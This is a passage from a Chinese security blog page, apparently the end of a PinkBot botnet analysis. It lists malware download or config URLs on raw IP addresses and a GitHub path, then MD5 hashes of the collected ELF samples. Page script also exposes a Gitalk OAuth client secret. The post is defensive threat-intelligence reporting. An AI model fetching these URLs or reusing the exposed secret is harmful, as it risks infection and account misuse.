+<li>http://222.216.226.29:81/dlist.txt</li>
+<li>http://45.32.26.220/dlist.txt</li>
+<li>http://45.76.104.146/dlist.txt</li>
+<li>http://45.77.165.83/p1/dlist.txt</li>
+<li>http://45.77.198.232/p1/dlist.txt</li>
+<li>http://45.88.42.38/p1/dlist.txt</li>
+<li>http://61.149.204.230:81/dlist.txt</li>
+<li>http://66.42.114.73/dlist.txt</li>
+<li>http://66.42.67.148/dlist.txt</li>
+<li>http://8.6.193.191/dlist.txt</li>
+<li>http://95.179.238.22/dlist.txt</li>
+<li>https://raw.githubusercontent.com/pink78day/helloworld/master/dlist.txt</li>
+</ul>
+<h2 id="md5">MD5</h2>
+<p>通过跟踪获取到的相关样本（ELF）汇总如下：</p>
+<blockquote>
+<p>9ec5bd857b998e60663e88a70480b828 /bin/protect<br>
+451a3cf94191c64b5cd1be1a80be7799 /bin/tr69c<br>
+06d6ad872e97e47e55f5b2777f78c1ba slient_l<br>
+07cd100c7187e9f4c94b54ebc60c0965 slient_b<br>
+0f25b0d54d05e58f5900c61f219341d3 client_b<br>
+0f89e43ea433fdfd18a551f755473388 slient_l<br>
+1197994610b2ffb60edbb5ab0c125bc0 client_b<br>
+167364ad0d623d17332f09dbb23a980e client_b<br>
+175b603082599838d9760b2ab264da6f slient_l<br>
+1a6dce9916b9b6ae50c1457f5f1dfbbd slient_l<br>
+229503686c854bb39efdc84f05b071b9 slient_b<br>
+25a07e3ef483672b4160aa12d67f5201 client_l<br>
+262a4e242c9ebeba79aa018d8b38d229 client_l<br>
+29d0afd2a244c9941976ebf2f0f6597f client_l<br>
+2befedd020748ff6d9470afad41bd28c slient_b<br>
+2ca5810744173889b2440e4f25b39bd4 client_l<br>
+36e48e141943a67c6fdeaa84d7af21cc client_b<br>
+3a620ff356686b461e0e1a12535bea24 slient_l<br>
+41bbe8421c0a78067bae74832c375fe8 slient_l<br>
+45ee78d11db54acfdda27c19e44c3126 client_l<br>
+4830c3950957093dac27d4e87556721e slient_l<br>
+484761f281cb2e64d9db963a463efca5 client_l<br>
+48a7f2799bf452f10f960159f6a405d3 client_l<br>
+494412638dc8d573172c1991200e1399 client_l<br>
+4c83ad66189a7c4d2f2afdbfb94d0e65 slient_b<br>
+50270de8d5783bb0092bf1677b93c97b slient_l<br>
+54aa9e716567bd0159f4751916f7f0d1 client_l<br>
+5ae1fec20c2f720269c2dc94732187e8 slient_b<br>
+5b62a9bd3431c2fd55283380d81c00fa client_b<br>
+5c322610e1845d0be9ccfc8a8b6a4c4f client_l<br>
+5c4f8dae67dad8cac141afa00847b418 slient_b<br>
+5d0d034845bd69179bf678104c046dc1 client_b<br>
+60658ef214c960147200d432eece3e13 slient_l<br>
+60a2b1bb02a60ac49f7cc1b47abdf60c client_l<br>
+610f0aadba3be1467125607bf2ba2aaf slient_l<br>
+66a068fd860bda7950fde8673d1b5511 client_b<br>
+6c4de9bd490841f0a6c68638f7253c65 client_b<br>
+72c531a813b637af3ea56f288d65cdb7 slient_b<br>
+7608b24c8dcf3cd7253dbd5390df8b1f client_b<br>
+7645a30a92863041cf93a7d8a9bfba1a client_b<br>
+857fc3c7630859c20d35d47899b75699 slient_b<br>
+861af6b5a3fea01f2e95c90594c62e9d client_l<br>
+8e86be3be36094e0f5b1a6e954dbe7c2 client_l<br>
+8fbcd7397d451e87c60a0328efe8cd5d client_b<br>
+987a9befb715b6346e7ad0f6ac87201f slient_b<br>
+9eb147e3636a4bb35f0ee1540d639a1b slient_b<br>
+aa2fc46dd94cbf52aef5e66cdd066a40 client_l<br>
+ae8b519504afc52ee3aceef087647d36 slient_b<br>
+b0202f1e8bded9c451c734e3e7f4e5d8 slient_b<br>
+b6f91ad027ded41e2b1f5bea375c4a42 slient_b<br>
+b9935859b3682c5023d9bcb71ee2fece slient_b<br>
+b9d1c31f59c67289928e1bb7710ec0ba client_l<br>
+bec2f560b7c771d7066da0bee5f2e001 client_b<br>
+c2efa35b34f67a932a814fd4636dd7cb slient_l<br>
+c839aff2a2680fb5676f12531fecba3b slient_b<br>
+c94504531159b8614b95c62cca6c50c9 slient_l<br>
+dfe0c9d36062dd3797de403a777577a6 client_b<br>
+e19a1106030e306cc027d56f0827f5ce slient_l<br>
+f09b45daadc872f2ac3cc6c4fe9cff90 client_b<br>
+f5381892ea8bd7f5c5b4556b31fd4b26 client_b<br>
+f55ad7afbe637efdaf03d4f96e432d10 slient_b<br>
+f62d4921e3cb32e229258b4e4790b63a client_b<br>
+f81c8227b964ddc92910890effff179b slient_b<br>
+fc5b55e9c6a9ddef54a256cc6bda3804 client_b<br>
+fe8e830229bda85921877f606d75e96d slient_l<br>
+fee6f8d44275dcd2e4d7c28189c5f5be client_l</p>
+</blockquote>
+
+                </div>
+                <div class="clear"></div>
+              </section>
+            </article>
+            <div class="clear"></div>
+
+            <section class="related section">
+              
+              <article class="prev grid-50 tablet-grid-50 grid-parent">
+                <div class="thumb cover lazy loaded" style="background-image: url('https://www.gd1214b.icu/post-images/b6xG1VQQo.webp');"></div>
+                 <a href="https://www.gd1214b.icu/post/b6xG1VQQo/" class="full-link"></a>
+                 <div class="info">
+                  <time datetime="2021-11-08">2021-11-08</time>
+                  <h4 class="title white no-margin">羽绒服、茅台与家长委员会</h4>
+                </div>
+                 <span class="epcl-button red">
+                  <img src="https://www.gd1214b.icu/media/images/left-arrow.svg" width="15" alt="Left Arrow">
+                </span>
+                <div class="overlay"></div>
+              </article>
+              
+              
+              <article class="next grid-50 tablet-grid-50 grid-parent">
+                <div class="thumb cover lazy loaded" style="background-image: url('https://www.gd1214b.icu/post-images/o8OKv2apb.jpg');"></div>
+                 <a href="https://www.gd1214b.icu/post/o8OKv2apb/" class="full-link"></a>
+                 <div class="info">
+                  <time datetime="2021-10-17">2021-10-17</time>
+                  <h4 class="title white no-margin">互联网的刻耳柏洛斯:GFW的DNS审查系统</h4>
+                </div>
+                 <span class="epcl-button red">
+                  <img src="https://www.gd1214b.icu/media/images/right-arrow.svg" width="15" alt="Left Arrow">
+                </span>
+                <div class="overlay"></div>
+              </article>
+              
+
+                <div class="clear"></div>
+            </section>
+
+              <div class="clear"></div>
+              
+            
+              <div id="comments" class="bg-white hosted ">
+                
+                  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+<div class="clear"></div>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '814b1bd24e8d16500e7d',
+    clientSecret: '2ca3dfed5c49a6f5905de256bfaffdd3e452f5ee',
+    repo: 'gd1214b.github.io',
+    owner: 'gd1214b',
+    admin: ['gd1214b'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+                
+                
+              </div>
+            
+
+            </div>
+          </div>
+      </main>
+
+      <footer id="footer" class="grid-container">
+  <div class="widgets row gradient-effect">
+    <div class="default-sidebar border-effect">
+      <div class="grid-33 tablet-grid-50 mobile-grid-100">
+        <section id="tag_cloud-2" class="widget widget_epcl_posts_thumbs underline-effect">
+          <h4 class="widget-title title white bordered">最新文章</h4>
+          
+            
+              <article
+                class="item post-0 post type-post status-publish format-standard has-post-thumbnail hentry">
+                <a href="https://www.gd1214b.icu/post/Wmy6lTJ40/" class="thumb hover-effect">
+                  <span class="fullimage cover"
+                    style="display:block;border-radius:50%;background-image: url('https://www.gd1214b.icu/post-images/Wmy6lTJ40.jpg');"></span>
+                </a>
+                <div class="info gradient-effect">
+                  <time datetime="2022-10-28">
+                    2022-10-28
+                  </time>
+                  <h4 class="title usmall">
+                    <a href="https://www.gd1214b.icu/post/Wmy6lTJ40/">
+                      中间人如何识别代理流量
+                    </a>
+                  </h4>
+                </div>
+                <div class="clear"></div>
+              </article>
+              
+                
+            
+              <article
+                class="item post-1 post type-post status-publish format-standard has-post-thumbnail hentry">
+                <a href="https://www.gd1214b.icu/post/t3pZq_036/" class="thumb hover-effect">
+                  <span class="fullimage cover"
+                    style="display:block;border-radius:50%;background-image: url('https://www.gd1214b.icu/post-images/t3pZq_036.webp');"></span>
+                </a>
+                <div class="info gradient-effect">
+                  <time datetime="2022-10-23">
+                    2022-10-23
+                  </time>
+                  <h4 class="title usmall">
+                    <a href="https://www.gd1214b.icu/post/t3pZq_036/">
+                      缓解假墙伪墙攻击勒索的多种技术手段
+                    </a>
+                  </h4>
+                </div>
+                <div class="clear"></div>
+              </article>
+              
+                
+            
+              <article
+                class="item post-2 post type-post status-publish format-standard has-post-thumbnail hentry">
+                <a href="https://www.gd1214b.icu/post/73oxVj2V1/" class="thumb hover-effect">
+                  <span class="fullimage cover"
+                    style="display:block;border-radius:50%;background-image: url('https://www.gd1214b.icu/post-images/73oxVj2V1.png');"></span>
+                </a>
+                <div class="info gradient-effect">
+                  <time datetime="2022-10-13">
+                    2022-10-13
+                  </time>
+                  <h4 class="title usmall">
+                    <a href="https://www.gd1214b.icu/post/73oxVj2V1/">
+                      IP 基础知识全家桶
+                    </a>
+                  </h4>
+                </div>
+                <div class="clear"></div>
+              </article>
+              
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+                  <div class="clear"></div>
+        </section>
+      </div>
+
+      <div class="grid-33 tablet-grid-50 mobile-grid-100">
+        <section id="tag_cloud-2" class="widget widget_tag_cloud underline-effect">
+          <h4 class="widget-title title white bordered">标签云</h4>
+          <div class="tagcloud">
+            
+              <a href="https://www.gd1214b.icu/tag/zhong-jian-ren-gong-ji/" class="ctag ctag-0 ctag-zhong-jian-ren-gong-ji" aria-label="">
+                中间人攻击
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/gfw/" class="ctag ctag-1 ctag-gfw" aria-label="">
+                GFW
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/wang-luo/" class="ctag ctag-2 ctag-wang-luo" aria-label="">
+                网络
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/ip/" class="ctag ctag-3 ctag-ip" aria-label="">
+                IP
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/vps/" class="ctag ctag-4 ctag-vps" aria-label="">
+                VPS
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/virtualbox/" class="ctag ctag-5 ctag-virtualbox" aria-label="">
+                VirtualBox
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/macos/" class="ctag ctag-6 ctag-macos" aria-label="">
+                macOS
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/pgp/" class="ctag ctag-7 ctag-pgp" aria-label="">
+                PGP
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/dns/" class="ctag ctag-8 ctag-dns" aria-label="">
+                DNS
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/yun-ying-shang/" class="ctag ctag-9 ctag-yun-ying-shang" aria-label="">
+                运营商
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/telegram/" class="ctag ctag-10 ctag-telegram" aria-label="">
+                Telegram
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/backblaze/" class="ctag ctag-11 ctag-backblaze" aria-label="">
+                Backblaze
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/cloudflare/" class="ctag ctag-12 ctag-cloudflare" aria-label="">
+                Cloudflare
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/jsdelivr/" class="ctag ctag-13 ctag-jsdelivr" aria-label="">
+                jsDelivr
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/an-quan/" class="ctag ctag-14 ctag-an-quan" aria-label="">
+                安全
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/diceware/" class="ctag ctag-15 ctag-diceware" aria-label="">
+                Diceware
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/rss/" class="ctag ctag-16 ctag-rss" aria-label="">
+                RSS
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/seo/" class="ctag ctag-17 ctag-seo" aria-label="">
+                SEO
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/koyeb/" class="ctag ctag-18 ctag-koyeb" aria-label="">
+                Koyeb
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/v2ray/" class="ctag ctag-19 ctag-v2ray" aria-label="">
+                v2ray
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/okteto/" class="ctag ctag-20 ctag-okteto" aria-label="">
+                Okteto
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/metaverse/" class="ctag ctag-21 ctag-metaverse" aria-label="">
+                Metaverse
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/shi-ping/" class="ctag ctag-22 ctag-shi-ping" aria-label="">
+                时评
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/pinkbot/" class="ctag ctag-23 ctag-pinkbot" aria-label="">
+                PinkBot
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/https/" class="ctag ctag-24 ctag-https" aria-label="">
+                HTTPS
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/ca-zheng-shu/" class="ctag ctag-25 ctag-ca-zheng-shu" aria-label="">
+                CA证书
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/windows-ji-huo/" class="ctag ctag-26 ctag-windows-ji-huo" aria-label="">
+                Windows激活
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/gpl/" class="ctag ctag-27 ctag-gpl" aria-label="">
+                GPL
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/onemanager/" class="ctag ctag-28 ctag-onemanager" aria-label="">
+                OneManager
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/glitch/" class="ctag ctag-29 ctag-glitch" aria-label="">
+                Glitch
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/onedrive/" class="ctag ctag-30 ctag-onedrive" aria-label="">
+                Onedrive
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/sui-bi/" class="ctag ctag-31 ctag-sui-bi" aria-label="">
+                随笔
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/windows-11/" class="ctag ctag-32 ctag-windows-11" aria-label="">
+                Windows 11
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/dnssec/" class="ctag ctag-33 ctag-dnssec" aria-label="">
+                DNSSEC
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/github-actions/" class="ctag ctag-34 ctag-github-actions" aria-label="">
+                GitHub Actions
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/upptime/" class="ctag ctag-35 ctag-upptime" aria-label="">
+                Upptime
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/gridea/" class="ctag ctag-36 ctag-gridea" aria-label="">
+                Gridea
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/cdn/" class="ctag ctag-37 ctag-cdn" aria-label="">
+                CDN
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/heroku/" class="ctag ctag-38 ctag-heroku" aria-label="">
+                Heroku
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/fastly/" class="ctag ctag-39 ctag-fastly" aria-label="">
+                Fastly
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/cloudflare-worker/" class="ctag ctag-40 ctag-cloudflare-worker" aria-label="">
+                Cloudflare Worker
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/fan-xiang-dai-li/" class="ctag ctag-41 ctag-fan-xiang-dai-li" aria-label="">
+                反向代理
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/program-think/" class="ctag ctag-42 ctag-program-think" aria-label="">
+                program-think
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/http/" class="ctag ctag-43 ctag-http" aria-label="">
+                HTTP
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/ddos/" class="ctag ctag-44 ctag-ddos" aria-label="">
+                DDoS
+              </a>
+              
+              <a href="https://www.gd1214b.icu/tag/ce-shi/" class="ctag ctag-45 ctag-ce-shi" aria-label="">
+                测试
+              </a>
+              
+          </div>
+          <div class="clear"></div>
+        </section>
+      </div>
+
+      <div class="grid-33 tablet-grid-50 mobile-grid-100">
+        <section id="epcl_about-2" class="widget widget_epcl_about underline-effect">
+          <h4 class="widget-title title white bordered">关于我</h4>
+          <div class="avatar">
+            <a href="" class="translate-effect thumb"><span class="fullimage cover"
+                style="background-image: url(https://www.gd1214b.icu/images/avatar.png);"></span></a>
+          </div>
+          <div class="info">
+            <h4 class="title small author-name gradient-effect no-margin"><a href="">
+                gd1214b&#39;s blog
+              </a></h4>
+            <p class="founder">
+              念念不忘，必有回响
+            </p>
+            <div class="social">
+              
+                
+                  <a href="" class="translate-effect" target="_blank"><i
+                      class="fa fa-github"></i></a>
+                  
+                    
+                
+                  <a href="" class="translate-effect" target="_blank"><i
+                      class="fa fa-twitter"></i></a>
+                  
+                    
+                
+                  <a href="" class="translate-effect" target="_blank"><i
+                      class="fa fa-instagram"></i></a>
+                  
+                    
+                
+                  <a href="" class="translate-effect" target="_blank"><i
+                      class="fa fa-telegram"></i></a>
+                  
+                    
+                
+                  <a href="" class="translate-effect" target="_blank"><i
+                      class="fa fa-feed"></i></a>
+                  
+                    
+            </div>
+          </div>
+          <div class="clear"></div>
+        </section>
+      </div>
+
+    </div>
+    <div class="clear"></div>
+  </div>
+
+
+  <p align="center">
+    <!--开往-->
+    <a href="https://travellings.cn/" target="_blank" rel="noopener" title="开往-友链接力">
+      <img src="https://travellings.cn/assets/logo.gif" alt="开往-友链接力" width="120">
+    </a>
+    ㅤㅤㅤ
+    <!--虫洞-->
+    <a href="https://www.foreverblog.cn/go.html" target="_blank"> <img src="https://img.foreverblog.cn/wormhole_3.gif"
+        alt="" style="width:auto;height:32px;" title="穿梭虫洞-随机访问十年之约友链博客"></a>
+  </p>
+
+
+  <p align="center">
+    本站访问次数：
+  </p>
+
+  <p align="center">
+
+    <img src="https://count.getloli.com/get/@gd1214b?theme=rule34">
+  </p>
+
+  
+
+  <p align="center">
+    <b> gd1214b保留所有权利。 Copyright © 2022 gd1214b. All Rights Reserved. </b>
+  </p>
+
+  <p align="center">
+     <a href="/post/copyright/">版权声明</a> | <a href="/post/privacy-policy/">隐私政策</a> | <a
+        href="/post/disclaimers/">免责声明</a> | <a href="/sitemap.xml">站点地图</a> | <a href="/post/about/">联系站长</a> | <a
+        class="rss" href="/atom.xml" target="_blank">RSS</a> |
+  </p>
+
+  <p align="center">
+    <img src="https://api.xhofe.top/ip/?line1=欢迎访问 gd1214b's blog&line2=念念不忘，必有回响">
+  </p>
+
+  <a href="javascript:void(0)" id="back-to-top" class="epcl-button dark" style="display:none">
+    <i class="fa fa-arrow"></i>
+  </a>
+</footer>
+
+<div class="clear"></div>
+
+
+      
+    <script src="https://www.gd1214b.icu/media/js/functions-post.js"></script>
+
+    </div>
+    <!-- end: #wrapper -->
+  </body>
+</html>
